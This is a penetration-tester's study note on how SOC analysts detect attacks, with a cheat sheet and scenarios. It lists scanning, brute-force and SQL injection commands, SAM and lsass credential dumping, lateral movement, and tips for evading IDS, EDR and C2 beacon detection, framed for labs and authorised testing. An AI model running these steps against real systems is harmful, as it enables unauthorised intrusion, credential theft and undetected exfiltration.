---
title: SOC analysts Shortcuts and tricks 
tags: [blue team, Vulnerability Assessment, Security Scanning]
description: to detect and respond to threats using tools like SIEM, IDS/IPS, and EDR
date: 2026-03-03
---



---

# SOC analysts

### Role and core concepts

- A security analyst (or SOC analyst) continuously monitors networks, systems, and applications to detect and respond to threats using tools like SIEM, IDS/IPS, and EDR. Their duties include threat and vulnerability analysis, alert triage, incident investigation, documentation, and coordination with IT/IR teams.[3](about:blank#fn3)[4](about:blank#fn4)[5](about:blank#fn5)
- Tiered SOC structures often have Tier 1 analysts handling initial triage, Tier 2 handling confirmed incidents, and Tier 3 doing deep forensics, threat hunting, and even internal red‑teaming. For you as a pentester, this means low‑fidelity noise might be filtered early, but sophisticated or persistent behaviors will get escalated and scrutinized.[6](about:blank#fn6)[7](about:blank#fn7)

### Analyst mindset vs attacker mindset

- Analysts think in terms of risk to business assets, detection coverage, and alert fidelity, while attackers think in terms of reachable attack surface, exploitability, and stealth. SOC workflows are often built around playbooks that map specific alerts or kill‑chain stages to standard response steps, which you can anticipate and try to bypass.[8](about:blank#fn8)[9](about:blank#fn9)
- Many SOCs rely heavily on correlation and anomaly detection from SIEM/IDS logs to prioritize alerts across the attack lifecycle, so combining multiple low‑noise techniques that appear unrelated can slip under correlation thresholds.[10](about:blank#fn10)[11](about:blank#fn11)

---

### Attack and detection kill chain

- Modern SOCs still use the Lockheed Martin cyber kill chain as a mental model: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control (C2), and Actions on Objectives. Some also use “unified kill chain” variants that group these into Initial Foothold, Network Propagation, and Actions on Objectives for more granular detection mapping.[12](about:blank#fn12)[13](about:blank#fn13)
- SIEM/EDR rules and threat‑hunting content are often explicitly aligned to kill‑chain stages: e.g., scans and login failures for Recon, phishing and malware for Delivery, exploit and privilege‑escalation behavior for Exploitation/Installation, and unusual outbound or data movement for C2/Actions.[14](about:blank#fn14)[15](about:blank#fn15)

### How analysts view each stage

1. **Reconnaissance**
    - Indicators: high‑volume port scans, web fuzzing, directory brute‑force, OSINT context about your infra. Analysts may use network IDS and firewall logs to flag unusual scanning or repeated hits on non‑existent URLs.[16](about:blank#fn16)[17](about:blank#fn17)
    - For you: balance speed vs stealth; consider slower or more targeted scans; reuse common user‑agent strings; avoid predictable scan patterns that trip “recon activity” rules.
2. **Weaponization & Delivery**
    - Indicators: phishing campaigns, malicious attachments, exploit kits, suspicious file downloads, or unexpected macros and scripts from email or web channels. SOCs correlate email gateway, proxy, and endpoint logs to catch these.[18](about:blank#fn18)[19](about:blank#fn19)
    - For you: prefer living‑off‑the‑land binaries (LOLbins), fileless techniques (e.g., in‑memory payloads), and “business‑like” traffic patterns rather than overt EXE delivery.
3. **Exploitation & Installation**
    - Indicators: exploit signatures in IDS, unusual process creation trees, new services or scheduled tasks, or persistence artifacts on endpoints, often detected via EDR + OS query tools.[20](about:blank#fn20)[21](about:blank#fn21)
    - For you: expect signatures for public exploits; customize payloads, encode shellcode, and avoid obvious persistence techniques like well‑known autorun keys or “suspicious” parent processes.
4. **Command & Control (C2)**
    - Indicators: beaconing patterns, outbound connections to known bad domains/IPs, odd DNS usage, or unusual long‑lived connections; SIEM correlation plus threat‑intel feeds make this stage heavily monitored.[22](about:blank#fn22)[23](about:blank#fn23)
    - For you: blend with normal traffic (443, 80, 53), use domain fronting or cloud hosts that already exist in their environment, and randomize beacon intervals.
5. **Actions on Objectives**
    - Indicators: mass file access, privilege escalation, lateral movement, large or unusual data transfers, or exfiltration to cloud/file‑sharing services.[24](about:blank#fn24)[25](about:blank#fn25)
    - For you: stage data locally, exfiltrate in small chunks disguised as normal protocols (HTTPS, DNS, SMB), and avoid one‑shot “big copy” actions whenever possible.

---

### Tooling and environment (blue‑team view you should expect)

- **SIEM (e.g., Splunk, Elastic, QRadar)** centralizes logs from firewalls, systems, apps, IDS, EDR, and cloud services so analysts can correlate and search events, generate alerts, and run dashboards. Many SOCs also integrate SOAR platforms to automate responses like blocking IPs or isolating hosts.[26](about:blank#fn26)[27](about:blank#fn27)
- **Network IDS/NSM (Suricata, Snort, Zeek/Bro)**: Suricata/Snort provide real‑time signature‑based detection and alerting on network traffic, while Zeek focuses on rich behavioral logging and context for threat hunting and forensics. Suricata alerts plus Zeek logs are often ingested into Elastic or Splunk for query and visualization.[28](about:blank#fn28)[29](about:blank#fn29)[30](about:blank#fn30)[31](about:blank#fn31)
- **Host‑based tools and EDR**: Open‑source options like Wazuh or OpenEDR provide endpoint visibility (processes, file changes, registry keys) and detect malware or suspicious behavior, feeding alerts back to SIEM or SOAR.[32](about:blank#fn32)
- **Incident management platforms (e.g., TheHive)** help analysts turn alerts into structured cases, track investigation steps, and coordinate response across teams.[33](about:blank#fn33)

---

### In‑depth exploitation steps (analyst vs attacker)

This section maps typical attack steps to what the analyst sees and what you can adjust.

1. **Network enumeration and scanning**
    - Analysts see: elevated counts of TCP SYNs to many ports, especially from atypical internal hosts, plus IDS rules for known scanner fingerprints (e.g., Nmap’s default probe patterns).[34](about:blank#fn34)[35](about:blank#fn35)
    - Attacker adjustments: prefer targeted host lists, service‑specific scans, and “timid” timing templates; reuse a common internal DNS resolver and user agent; schedule scans during busy hours.
2. **Web exploitation (e.g., SQLi, LFI/RFI, auth bypass)**
    - Analysts see: high 404/500 rates, weird query strings, SQL keywords in URLs, high‑rate fuzzing, and WAF signatures firing, all visible in web server logs, WAF logs, and SIEM dashboards.[36](about:blank#fn36)[37](about:blank#fn37)
    - Attacker adjustments: throttle fuzzing, use wordlists tuned to the tech stack, obfuscate payloads, and mix benign and malicious requests to look like noisy but “human” browsing.
3. **Lateral movement and privilege escalation**
    - Analysts see: new SMB/WinRM/SSH logons from unusual hosts, use of administrative shares, anomalous Kerberos ticket usage, or sudden group membership changes.[38](about:blank#fn38)[39](about:blank#fn39)
    - Attacker adjustments: pivot from likely admin workstations or management servers, mimic existing admin behavior, and avoid unnecessary lateral hops.
4. **Persistence and long‑term access**
    - Analysts see: new autorun entries, scheduled tasks, service installs, or EDR‑flagged persistence patterns on endpoints.[40](about:blank#fn40)[41](about:blank#fn41)
    - Attacker adjustments: prefer existing IT mechanisms (GPO, enterprise schedulers, SSO sessions), and short‑lived access (noisy but fast) when stealth isn’t required (e.g., CTFs).

---

### Defensive indicators and red flags (what gets you caught)

- **Recon & scanning red flags**: repeated scanning of the same subnets, large spikes in connection attempts to closed ports, frequent HTTP 404/403 hits, or directory brute‑force patterns.[42](about:blank#fn42)[43](about:blank#fn43)
- **Auth & access red flags**: repeated failed logons, logins from unusual geos or devices, account usage at odd hours, or sudden privilege elevation, often caught by SIEM risk‑based analytics and anomaly‑based IDS.[44](about:blank#fn44)[45](about:blank#fn45)
- **Malware & exploitation red flags**: exploit kit signatures, known C2 frameworks, process injection, or suspicious child processes (e.g., Office spawning PowerShell, scripts dropping binaries).[46](about:blank#fn46)[47](about:blank#fn47)
- **C2 & exfiltration red flags**: outbound traffic to known malicious indicators, DNS tunneling‑like query patterns, unexpected encrypted traffic to uncommon destinations, or large data transfers to cloud storage.[48](about:blank#fn48)[49](about:blank#fn49)

---

### Common hurdles and mitigation bypasses

- **Signature‑based IDS/WAF**
    - Hurdle: rules that trigger on known exploits, scanner fingerprints, and common payloads.[50](about:blank#fn50)[51](about:blank#fn51)
    - Bypass: payload randomization, alternate encodings, modifying user‑agents, and using less‑popular tools or hand‑crafted requests.
- **Anomaly‑based / behavior‑based detection**
    - Hurdle: baselines of “normal” behavior; deviations (e.g., new host doing heavy SMB enumeration) trigger alerts even if signatures are clean.[52](about:blank#fn52)
    - Bypass: blend with expected behavior (e.g., pivot from admin servers, use work hours, match typical traffic volumes).
- **Alert correlation and prioritization**
    - Hurdle: SIEM correlates multi‑stage behaviors; scattered activities across hosts/users can still be tied into one incident.[53](about:blank#fn53)[54](about:blank#fn54)
    - Bypass: keep campaigns short in time, separate kill chains by identity and infra, and avoid reusing the same IOCs across many hosts.

---

## 2. Rapid‑Reference Cheatsheet (Commands & Flows)

Use this section during labs/engagements; commands are generic Linux/Kali unless noted.

### General process (mental loop)

1. Identify scope → Hosts/IPs, domains, key business assets.
2. Enumerate quietly → Ports, services, versions, web endpoints, shares, users.
3. Pick likely attack paths → Web vulns, weak auth, exposed management services, SMB/AD misconfig.
4. Exploit with detection in mind → Tune payloads, avoid unnecessary noise.
5. Post‑exploit → Loot creds, expand access, show impact, then clean/log artifacts as needed.

---

### Network enumeration (with detection awareness)

- Fast, noisy scan (lab / CTF only):
    - `nmap -sC -sV -O -Pn <target>`
- Stealthier, targeted:
    - `nmap -sV -sT --top-ports 100 --reason <target>`
    - `nmap -sV -sT -p 21,22,80,443,445,3389 <target>`
- UDP checks (noisy, but sometimes necessary):
    - `nmap -sU --top-ports 20 <target>`

**If‑then flow**

- If many ports open on one host → prioritize 80/443/445/3389 and any management ports (RDP, WinRM, SSH).
- If only 80/443 open → switch to web enumeration and app‑layer attacks.
- If 445/139 open → focus on SMB/AD/Windows attacks.

---

### Web enumeration & testing

- Basic virtual host and tech detection:
    - `whatweb http://<target>`
    - `nikto -h http://<target>` (noisy; in labs ok)
- Directory/file brute‑force:
    - `ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302`
- Parameter brute‑force:
    - `ffuf -u "http://<target>/index.php?FUZZ=1" -w params.txt -fs 0`

**If‑then flow**

- If 200/403 on “admin”, “login”, “upload” → focus on auth bypass, brute‑force, or upload abuse.
- If responses differ on `'` or `"` → check for SQLi with manual payloads then automate with `sqlmap`.
- If file extensions reveal `.php`, `.asp`, `.aspx` → choose payloads and wordlists aligned with that stack.

---

### Auth and credential attacks

- Username enumeration (HTTP forms):
    - Use Burp Intruder cluster bomb, or:
    - `ffuf -u http://<target>/login -X POST -d "user=FUZZ&pass=test" -w users.txt -mr "invalid password"`
- SSH brute‑force (only in labs and with permission):
    - `hydra -L users.txt -P rockyou.txt ssh://<target>`
- SMB auth checks:
    - `crackmapexec smb <target> -u users.txt -p passwords.txt --local-auth`

**If‑then flow**

- If account lockout observed → stop brute‑force, switch to password spraying with long delays.
- If default/weak creds work on one service → try same creds on others (WinRM, RDP, databases).

---

### SMB / Windows / AD enumeration

- Quick share/user info:
    - `enum4linux -a <target>`
- Null session RPC:
    - `rpcclient -U "" <target>` then `enumdomusers`, `querygroup`, etc.
- SMB shares:
    - `smbclient -L //<target>/ -N`

```
- `smbclient \\\\<target>\\<SHARE> -U "<user>"`
```

**If‑then flow**

- If null sessions allowed → dump users/groups, share lists, and SIDs for further attacks.
- If share is readable (e.g., “Public”, “Documents”) → recursively list and hunt for creds, scripts, configs.
- If AD identified (Domain Controller) → pivot to Kerberoasting, AS‑REP roasting, or delegation issues.

---

### WAF/IDS/EDR evasion snippets

- HTTP/web evasion ideas:
    - Insert comments/whitespace: `UNION/**/SELECT`, `OR/**/1=1--`
    - Change case or use encoding: `UnIoN SeLeCt`, URL‑encode payload parts.
    - Use less obvious payloads (Boolean/time‑based instead of UNION where signatures are strict).
- Nmap evasion ideas:
    - Throttle and randomize: `nmap -sS -T2 --scan-delay 100ms <target>`
    - Use decoys only in labs: `nmap -sS -D RND:10 <target>` (may still be obvious to an analyst).
    - Spoof user‑agents in application‑layer probes where supported.
- EDR/host evasion ideas:
    - Prefer built‑in tools (PowerShell, certutil, bitsadmin, bash, curl) and in‑memory execution over dropping obvious binaries.
    - Avoid known offensive tool paths and names (e.g., `mimikatz.exe`); rename and recompile when possible.

---

### Post‑exploitation shortcuts

- Credential harvesting (Windows):
    - `reg save HKLM\\SYSTEM system.hive` and `reg save HKLM\\SAM sam.hive` for offline cracking.
    - Use tools like `lsass` minidump via `rundll32 comsvcs.dll, MiniDump` (labs) or process‑dump modules in frameworks.
- Lateral movement (Windows):

```
- `psexec.py <domain>/<user>:<pass>@<target>` (Impacket).
```

```
- `wmiexec.py <domain>/<user>:<pass>@<target>` for fileless WMI exec.
```

- Linux privilege escalation quick checks:
    - `sudo -l`, `find / -perm -4000 -type f 2>/dev/null`, `linpeas.sh` (lab convenience).
    - Check world‑writable config files, cron jobs, and service misconfig.

---

## 3. Real‑World Examples & Usage Scenarios

### Scenario 1: SQL Injection (with WAF/SIEM aware behavior)

- **Goal**: Exploit SQLi while minimizing obvious signatures.
- **Initial probe**:
    - Manually browse, then try:
        - `http://target/page.php?id=1'` and observe response codes/time.
- **Automated test**:
    - `sqlmap -u "http://target/page.php?id=1" --batch`
- **If numeric injection detected** → prioritize time‑based or boolean tests:
    - `sqlmap -u "http://target/page.php?id=1" --batch --technique=T --time-sec=5`
- **If WAF blocks basic payloads**:
    - Modify tampering and union style:
        - `sqlmap -u "http://target/page.php?id=1" --batch --tamper=space2comment,between`
    - Craft manual payloads like:
        - `id=1 UNION/**/SELECT username,password FROM users-- -`

**What the analyst sees**

- Repeated similar requests with SQL keywords and anomalies in query strings; WAF alerts on SQLi patterns; unusual 500/403/406 codes in web logs.[55](about:blank#fn55)[56](about:blank#fn56)
- If you slow down requests, vary parameters, and mix normal browsing, your traffic may look like a buggy client instead of a clear automated scan.

---

### Scenario 2: SMB enumeration and lateral movement

- **Goal**: Enumerate SMB and pivot while understanding detection risk.
- **Host discovery**:
    - `nmap -p 445 --open <subnet>/24`
- **SMB enumeration**:
    - `enum4linux -a 10.10.10.5`
- **If null sessions allowed**:
    - `rpcclient -U "" 10.10.10.5`
    - Inside `rpcclient`:
        - `enumdomusers`, `enumdomgroups`, `querygroupmem <RID>`
- **If share “Documents” exists**:
    - `smbclient \\\\10.10.10.5\\Documents -N`
    - Then: `recurse on`, `ls`, `get` interesting files.

**What the analyst sees**

- Numerous 445 connections, anonymous logons, and share enumeration events, often correlated as suspicious lateral movement or recon in AD contexts.[57](about:blank#fn57)[58](about:blank#fn58)
- If you stage activity from a known admin workstation and space out enumeration, it may resemble legitimate admin work more than an obvious attack.

---

### Scenario 3: SOC analyst investigating Suricata + Zeek alerts (network‑centric lab)

- **Lab setup**: Suricata for real‑time network IDS alerts, Zeek for detailed connection/HTTP/DNS logs, both feeding Elastic/Kibana dashboards.[59](about:blank#fn59)[60](about:blank#fn60)[61](about:blank#fn61)
- **Attack**: You run a loud directory brute‑force with:
    - `ffuf -u http://10.10.10.20/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302`

**Analyst’s workflow**

- Sees Suricata alerts for HTTP anomalies and brute‑force patterns (e.g., many 404s to varying paths) and high request volume from one source IP.[62](about:blank#fn62)[63](about:blank#fn63)
- Jumps into Zeek `http.log` to inspect user‑agent, URI patterns, and timing, confirming automated fuzzing vs normal user traffic.[64](about:blank#fn64)[65](about:blank#fn65)

**Your adaptation**

- Throttle ffuf (`rate 5`), randomize wordlist ordering, and use a realistic user‑agent to reduce detection likelihood.
- Mix in manual browsing and smaller, targeted wordlists (e.g., tech‑stack specific) rather than blasting huge lists.

---

### Scenario 4: C2 beacon detection and evasion

- **Attack**: You establish a reverse shell over HTTPS to a VPS:
    - Payload behaves like `beacon every 5s to https://cloud‑like‑domain.com/api`.
- **Analyst’s perspective**
    - SIEM notices consistent short‑interval outbound connections to an unusual external domain/IP, with fixed data sizes and no user activity correlation; this pattern is classic C2 beaconing.[66](about:blank#fn66)[67](about:blank#fn67)
    - Threat‑intel feed may already mark the C2 IP or domain as suspicious, generating a high‑severity alert.[68](about:blank#fn68)

**Your adaptation**

- Randomize beacon intervals and jitter (e.g., 30–90 seconds), pad data to variable lengths, and use a domain or path pattern similar to legitimate SaaS applications.
- In labs, you can prove the concept even with obvious C2 infra; in real engagements, consider using customer‑approved “red infra” domains or cloud regions already whitelisted.

---

### Scenario 5: Privilege escalation under SOC scrutiny (Windows endpoint)

- **Attack**: Low‑priv user shell on a monitored endpoint; you want SYSTEM.
- **Initial checks**:
    - `whoami /priv`, `systeminfo`, `wmic qfe list full /format:table`
- **If unpatched kernel vuln present (lab)**:
    - Use exploit binary (custom compiled) rather than default POC names.
- **If misconfigured service found**:
    - Modify service path or binary via normal admin tools (`sc config`, `sc start`) to achieve escalation.

**Analyst’s view**

- EDR sees exploit binary execution, abnormal privilege escalation, or suspicious child processes from user contexts and correlates with endpoint telemetry.[69](about:blank#fn69)[70](about:blank#fn70)
- If you use OS‑native tools to adjust existing services, the behavior may still be suspicious but looks closer to admin misconfig than exploit POC use.

---

---

1. https://www.exabeam.com/blog/security-operations-center/soc-analyst-job-description-skills-and-5-key-responsibilities/[↩︎](about:blank#fnref1)
2. https://www.splunk.com/en_us/blog/learn/security-analyst-role-responsibilities.html[↩︎](about:blank#fnref2)
3. https://socmasters.in/soc-analyst-roles-and-responsibilities/[↩︎](about:blank#fnref3)
4. https://www.splunk.com/en_us/blog/learn/security-analyst-role-responsibilities.html[↩︎](about:blank#fnref4)
5. https://www.exabeam.com/blog/security-operations-center/soc-analyst-job-description-skills-and-5-key-responsibilities/[↩︎](about:blank#fnref5)
6. https://www.exabeam.com/blog/security-operations-center/soc-analyst-job-description-skills-and-5-key-responsibilities/[↩︎](about:blank#fnref6)
7. https://socmasters.in/soc-analyst-roles-and-responsibilities/[↩︎](about:blank#fnref7)
8. https://www.splunk.com/en_us/blog/learn/security-analyst-role-responsibilities.html[↩︎](about:blank#fnref8)
9. https://www.splunk.com/en_us/blog/learn/cyber-kill-chains.html[↩︎](about:blank#fnref9)
10. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref10)
11. https://levelblue.com/ blogs/security-essentials/open-source-intrusion-detection-tools-a-quick-overview[↩︎](about:blank#fnref11)
12. https://cloudsecurityalliance.org/blog/2025/10/20/cyber-threat-intelligence-ai-driven-kill-chain-prediction[↩︎](about:blank#fnref12)
13. https://www.splunk.com/en_us/blog/learn/cyber-kill-chains.html[↩︎](about:blank#fnref13)
14. https://www.webasha.com/blog/how-soc-teams-use-the-cyber-kill-chain-to-detect-and-stop-cyberattacks-in-real-time[↩︎](about:blank#fnref14)
15. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref15)
16. https://www.splunk.com/en_us/blog/learn/cyber-kill-chains.html[↩︎](about:blank#fnref16)
17. https://www.darktrace.com/cyber-ai-glossary/cyber-kill-chain[↩︎](about:blank#fnref17)
18. https://www.webasha.com/blog/how-soc-teams-use-the-cyber-kill-chain-to-detect-and-stop-cyberattacks-in-real-time[↩︎](about:blank#fnref18)
19. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref19)
20. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref20)
21. https://www.webasha.com/blog/how-soc-teams-use-the-cyber-kill-chain-to-detect-and-stop-cyberattacks-in-real-time[↩︎](about:blank#fnref21)
22. https://cloudsecurityalliance.org/blog/2025/10/20/cyber-threat-intelligence-ai-driven-kill-chain-prediction[↩︎](about:blank#fnref22)
23. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref23)
24. https://cloudsecurityalliance.org/blog/2025/10/20/cyber-threat-intelligence-ai-driven-kill-chain-prediction[↩︎](about:blank#fnref24)
25. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref25)
26. https://www.splunk.com/en_us/blog/learn/security-analyst-role-responsibilities.html[↩︎](about:blank#fnref26)
27. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref27)
28. https://www.cyber-defence.io/blog/open-source-tools-for-soc-analysts[↩︎](about:blank#fnref28)
29. https://www.youtube.com/watch?v=yy_iWch2PoU[↩︎](about:blank#fnref29)
30. https://redcanary.com/cybersecurity-101/security-operations/top-free-siem-tools/[↩︎](about:blank#fnref30)
31. https://levelblue.com/ blogs/security-essentials/open-source-intrusion-detection-tools-a-quick-overview[↩︎](about:blank#fnref31)
32. https://www.cyber-defence.io/blog/open-source-tools-for-soc-analysts[↩︎](about:blank#fnref32)
33. https://www.cyber-defence.io/blog/open-source-tools-for-soc-analysts[↩︎](about:blank#fnref33)
34. https://levelblue.com/ blogs/security-essentials/open-source-intrusion-detection-tools-a-quick-overview[↩︎](about:blank#fnref34)
35. https://www.splunk.com/en_us/blog/learn/cyber-kill-chains.html[↩︎](about:blank#fnref35)
36. https://www.splunk.com/en_us/blog/learn/cyber-kill-chains.html[↩︎](about:blank#fnref36)
37. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref37)
38. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref38)
39. https://cloudsecurityalliance.org/blog/2025/10/20/cyber-threat-intelligence-ai-driven-kill-chain-prediction[↩︎](about:blank#fnref39)
40. https://www.webasha.com/blog/how-soc-teams-use-the-cyber-kill-chain-to-detect-and-stop-cyberattacks-in-real-time[↩︎](about:blank#fnref40)
41. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref41)
42. https://www.darktrace.com/cyber-ai-glossary/cyber-kill-chain[↩︎](about:blank#fnref42)
43. https://www.splunk.com/en_us/blog/learn/cyber-kill-chains.html[↩︎](about:blank#fnref43)
44. https://levelblue.com/ blogs/security-essentials/open-source-intrusion-detection-tools-a-quick-overview[↩︎](about:blank#fnref44)
45. https://www.splunk.com/en_us/blog/learn/security-analyst-role-responsibilities.html[↩︎](about:blank#fnref45)
46. https://www.webasha.com/blog/how-soc-teams-use-the-cyber-kill-chain-to-detect-and-stop-cyberattacks-in-real-time[↩︎](about:blank#fnref46)
47. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref47)
48. https://cloudsecurityalliance.org/blog/2025/10/20/cyber-threat-intelligence-ai-driven-kill-chain-prediction[↩︎](about:blank#fnref48)
49. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref49)
50. https://redcanary.com/cybersecurity-101/security-operations/top-free-siem-tools/[↩︎](about:blank#fnref50)
51. https://levelblue.com/ blogs/security-essentials/open-source-intrusion-detection-tools-a-quick-overview[↩︎](about:blank#fnref51)
52. https://levelblue.com/ blogs/security-essentials/open-source-intrusion-detection-tools-a-quick-overview[↩︎](about:blank#fnref52)
53. https://www.splunk.com/en_us/blog/learn/cyber-kill-chains.html[↩︎](about:blank#fnref53)
54. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref54)
55. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref55)
56. https://www.splunk.com/en_us/blog/learn/cyber-kill-chains.html[↩︎](about:blank#fnref56)
57. https://cloudsecurityalliance.org/blog/2025/10/20/cyber-threat-intelligence-ai-driven-kill-chain-prediction[↩︎](about:blank#fnref57)
58. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref58)
59. https://www.youtube.com/watch?v=yy_iWch2PoU[↩︎](about:blank#fnref59)
60. https://redcanary.com/cybersecurity-101/security-operations/top-free-siem-tools/[↩︎](about:blank#fnref60)
61. https://www.cyber-defence.io/blog/open-source-tools-for-soc-analysts[↩︎](about:blank#fnref61)
62. https://redcanary.com/cybersecurity-101/security-operations/top-free-siem-tools/[↩︎](about:blank#fnref62)
63. https://www.cyber-defence.io/blog/open-source-tools-for-soc-analysts[↩︎](about:blank#fnref63)
64. https://www.youtube.com/watch?v=yy_iWch2PoU[↩︎](about:blank#fnref64)
65. https://www.cyber-defence.io/blog/open-source-tools-for-soc-analysts[↩︎](about:blank#fnref65)
66. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref66)
67. https://cloudsecurityalliance.org/blog/2025/10/20/cyber-threat-intelligence-ai-driven-kill-chain-prediction[↩︎](about:blank#fnref67)
68. https://cloudsecurityalliance.org/blog/2025/10/20/cyber-threat-intelligence-ai-driven-kill-chain-prediction[↩︎](about:blank#fnref68)
69. https://www.webasha.com/blog/how-soc-teams-use-the-cyber-kill-chain-to-detect-and-stop-cyberattacks-in-real-time[↩︎](about:blank#fnref69)
70. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref70)
71. https://radiantsecurity.ai/learn/soc-analyst-roles-and-responsibilities/[↩︎](about:blank#fnref71)
72. https://www.exabeam.com/blog/security-operations-center/soc-analyst-job-description-skills-and-5-key-responsibilities/[↩︎](about:blank#fnref72)
73. https://www.splunk.com/en_us/blog/learn/security-analyst-role-responsibilities.html[↩︎](about:blank#fnref73)
74. https://seceon.com/understanding-the-cyber-kill-chain-a-strategic-framework-for-modern-threat-defense/[↩︎](about:blank#fnref74)
75. https://www.reddit.com/r/AskNetsec/comments/ka1ww1/need_help_understandingquestion_on_common/[↩︎](about:blank#fnref75)
76. https://www.coursera.org/articles/soc-analyst[↩︎](about:blank#fnref76)
